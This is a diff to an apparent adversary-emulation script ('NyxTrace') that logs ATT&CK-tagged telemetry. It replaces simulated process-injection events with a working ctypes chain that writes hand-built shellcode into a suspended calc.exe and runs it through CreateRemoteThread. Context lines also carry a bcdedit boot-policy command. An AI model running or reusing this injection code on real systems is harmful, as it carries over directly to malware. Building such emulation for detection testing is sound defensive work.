@@ -18,6 +18,7 @@ from pathlib import Path
 from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter
 
 import socket
+import struct
 
 
 def main() -> int:
@@ -94,22 +95,145 @@ def main() -> int:
              command="bcdedit /set {default} bootstatuspolicy ignoreallfailures",
              detail="Boot policy modification attempted", technique_id="T1542.003")
 
-    # Phase 6: Process injection
+    # Phase 6: Process injection (real ctypes-based)
     if env != EnvSafety.SUSPICIOUS:
         set_phase("process_injection")
-        targets = ["explorer.exe", "svchost.exe", "lsass.exe"]
-        for proc in targets:
-            emit("PROCESS", "OPEN_PROCESS", proc, "CRITICAL",
+
+        target = r"C:\Windows\System32\calc.exe"
+        emit("PROCESS", "CREATE_PROCESS", target, "CRITICAL",
+             source_process="winlogon_e.exe",
+             creation_flags="CREATE_SUSPENDED",
+             detail="Spawning calc.exe suspended for injection", technique_id="T1055.012")
+
+        try:
+            import ctypes
+            from ctypes import wintypes
+
+            kernel32 = ctypes.windll.kernel32
+
+            # Resolve MessageBoxW address from loaded user32
+            user32 = ctypes.windll.user32
+            msgbox_addr = ctypes.cast(user32.MessageBoxW, ctypes.c_void_p).value
+
+            # Build benign shellcode: MessageBoxW(0, msg, caption, 0)
+            caption = "NyxTrace\x00"
+            message = "Process Injection Test\x00"
+            caption_utf16 = caption.encode("utf-16le")
+            message_utf16 = message.encode("utf-16le")
+
+            sc = bytearray()
+            sc.extend([0x48, 0x83, 0xEC, 0x28])  # sub rsp, 0x28
+
+            sc.extend([0x48, 0x31, 0xC9])          # xor rcx, rcx  (hWnd = 0)
+
+            msg_rip_off = len(sc) + 2
+            sc.extend([0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00])  # lea rdx, [rip + X]
+
+            cap_rip_off = len(sc) + 2
+            sc.extend([0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00])  # lea r8, [rip + Y]
+
+            sc.extend([0x45, 0x31, 0xC9])          # xor r9d, r9d  (uType = 0)
+
+            sc.extend([0x48, 0xB8])                 # mov rax, msgbox_addr
+            sc.extend(struct.pack("<Q", msgbox_addr))
+
+            sc.extend([0xFF, 0xD0])                 # call rax
+            sc.extend([0x48, 0x83, 0xC4, 0x28])     # add rsp, 0x28
+            sc.extend([0x31, 0xC0])                 # xor eax, eax
+            sc.extend([0xC3])                       # ret
+
+            string_start = len(sc)
+            msg_start = string_start
+            sc.extend(caption_utf16)
+            cap_start = len(sc)
+            sc.extend(message_utf16)
+
+            msg_off = msg_start - (msg_rip_off + 4)
+            struct.pack_into("<i", sc, msg_rip_off, msg_off)
+            cap_off = cap_start - (cap_rip_off + 4)
+            struct.pack_into("<i", sc, cap_rip_off, cap_off)
+
+            shellcode = bytes(sc)
+
+            # Spawn target suspended
+            CREATE_SUSPENDED = 0x00000004
+            si = wintypes.STARTUPINFOW()
+            pi = wintypes.PROCESS_INFORMATION()
+
+            ok = kernel32.CreateProcessW(
+                target, None, None, None, False,
+                CREATE_SUSPENDED, None, None,
+                ctypes.byref(si), ctypes.byref(pi))
+            if not ok:
+                raise ctypes.WinError()
+
+            emit("PROCESS", "OPEN_PROCESS", target, "CRITICAL",
                  source_process="winlogon_e.exe",
+                 target_pid=pi.dwProcessId,
                  access_rights="PROCESS_ALL_ACCESS",
-                 detail=f"Opening {proc} for injection", technique_id="T1055")
-            emit("PROCESS", "WRITE_MEMORY", proc, "CRITICAL",
+                 detail=f"Opened calc.exe (PID={pi.dwProcessId}) for injection",
+                 technique_id="T1055")
+
+            # Allocate memory in target
+            PAGE_EXECUTE_READWRITE = 0x40
+            MEM_COMMIT = 0x1000
+            addr = kernel32.VirtualAllocEx(
+                pi.hProcess, None, len(shellcode),
+                MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+
+            emit("PROCESS", "WRITE_MEMORY", target, "CRITICAL",
                  source_process="winlogon_e.exe",
-                 detail=f"Writing shellcode to {proc} memory space", technique_id="T1055.001")
-            emit("PROCESS", "CREATE_THREAD", proc, "CRITICAL",
+                 target_pid=pi.dwProcessId,
+                 allocation_base=hex(addr),
+                 detail=f"Allocated {len(shellcode)} bytes at {hex(addr)}",
+                 technique_id="T1055.001")
+
+            # Write shellcode
+            written = wintypes.SIZE_T(0)
+            kernel32.WriteProcessMemory(
+                pi.hProcess, addr, shellcode, len(shellcode),
+                ctypes.byref(written))
+
+            emit("PROCESS", "WRITE_MEMORY", target, "CRITICAL",
                  source_process="winlogon_e.exe",
-                 detail=f"Remote thread created in {proc}", technique_id="T1055.003")
-            jitter(0.2, 0.2)
+                 target_pid=pi.dwProcessId,
+                 bytes_written=written.value,
+                 detail=f"Shellcode written: {written.value} bytes at {hex(addr)}",
+                 technique_id="T1055.001")
+
+            # Create remote thread
+            thread_id = wintypes.DWORD(0)
+            thread_handle = kernel32.CreateRemoteThread(
+                pi.hProcess, None, 0, addr, None, 0,
+                ctypes.byref(thread_id))
+
+            emit("PROCESS", "CREATE_THREAD", target, "CRITICAL",
+                 source_process="winlogon_e.exe",
+                 target_pid=pi.dwProcessId,
+                 thread_id=thread_id.value,
+                 start_address=hex(addr),
+                 detail=f"Remote thread created (TID={thread_id.value}) executing shellcode",
+                 technique_id="T1055.003")
+
+            # Wait briefly, then clean up
+            kernel32.WaitForSingleObject(thread_handle, 1000)
+            kernel32.ResumeThread(pi.hThread)
+
+            jitter(0.5, 0.3)
+
+            kernel32.TerminateProcess(pi.hProcess, 0)
+            kernel32.CloseHandle(thread_handle)
+            kernel32.CloseHandle(pi.hProcess)
+            kernel32.CloseHandle(pi.hThread)
+
+            emit("PROCESS", "EXIT_PROCESS", target, "INFO",
+                 source_process="winlogon_e.exe",
+                 target_pid=pi.dwProcessId,
+                 detail="calc.exe terminated after injection test")
+
+        except Exception as e:
+            emit("PROCESS", "CREATE_PROCESS", target, "WARNING",
+                 source_process="winlogon_e.exe", error=str(e))
 
     # Phase 7: Network callback
     set_phase("c2_callback")
@@ -125,7 +249,7 @@ def main() -> int:
         pass
 
     emit("PROCESS", "EXIT_PROCESS", "winlogon_e.exe", "INFO",
-         source_process="winlogon_e.exe", persistence_methods=4, injection_targets=len(targets))
+         source_process="winlogon_e.exe", persistence_methods=4)
     return 0
 
 
